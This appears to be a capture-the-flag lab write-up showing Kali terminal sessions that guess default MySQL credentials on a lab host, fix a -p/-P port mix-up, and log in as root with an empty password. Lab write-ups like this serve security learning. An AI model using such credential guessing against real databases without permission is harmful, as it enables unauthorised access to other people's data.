
### Attempting logins
```
┌──(kali㉿kali)-[~]
└─$ mysql -h 10.129.62.240 -p 3306 -u admin -p --ssl-mode=REQUIRED
mysql: unknown variable 'ssl-mode=REQUIRED'
                                                                             
┌──(kali㉿kali)-[~]
└─$ mysql -h 10.129.62.240 -p 3306 -u admin -p --skip-ssl         
Enter password: 
ERROR 1045 (28000): Access denied for user 'admin'@'10.10.14.40' (using password: YES)

┌──(kali㉿kali)-[~]
└─$ mysql -h 10.129.62.240 -p 3306 -u admin -p --skip-ssl
Enter password: 
ERROR 1045 (28000): Access denied for user 'admin'@'10.10.14.40' (using password: NO)
                                                                             
┌──(kali㉿kali)-[~]
└─$ mysql -h 10.129.62.240 -p 3306 -u root -p --skip-ssl
Enter password: 
ERROR 1049 (42000): Unknown database '3306'
```
### correct creds, wrong flag
```
man mysql
       •   --port=port_num, -P port_num

           The TCP/IP port number to use for the connection or 0 for default
           to, in order of preference, my.cnf, $MYSQL_TCP_PORT,
           /etc/services, built-in default (3306).  Forces --protocol=tcp
           when specified on the command line without other connection
           properties.

```

Manual attempts

| username | password | access |
| -------- | -------- | ------ |
| admin    | admin    |        |
| admin    |          |        |
| root     | root     |        |
| root     |          | yes    |

### Access granted to mysql server
```
┌──(kali㉿kali)-[~]
└─$ mysql -h 10.129.62.240 -P 3306 -u root -p --skip-ssl
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 120
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> 
```